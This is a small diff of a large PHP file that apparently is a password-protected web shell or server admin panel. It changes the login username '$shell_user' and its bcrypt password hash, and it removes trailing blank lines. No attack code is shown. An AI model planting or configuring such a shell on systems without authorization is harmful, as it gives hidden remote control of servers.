@@ -18,8 +18,8 @@ $CONFIG = [
 
 // USER & PASSWORD CONFIGURATION
 
-$shell_user   = 'admin#09';
-$stored_hash  = '$2y$10$G1.EEy4oOamPAqOmloCfKuolSgAlkat6eo7DeyyOHIcEmc.BihN.C';
+$shell_user   = 'adminin';
+$stored_hash  = '$2y$10$8yxs6Mrmb7HS9CX8SMyRXOg/gWzY1hRe02UNYDxe2opWjBvbn8fxq';
 
 session_start(['cookie_httponly' => true]);
 
@@ -3037,6 +3037,4 @@ $server_host = gethostname() ?: ($_SERVER['SERVER_NAME'] ?? 'server');
         }
     </script>
 </body>
-
 </html>
-
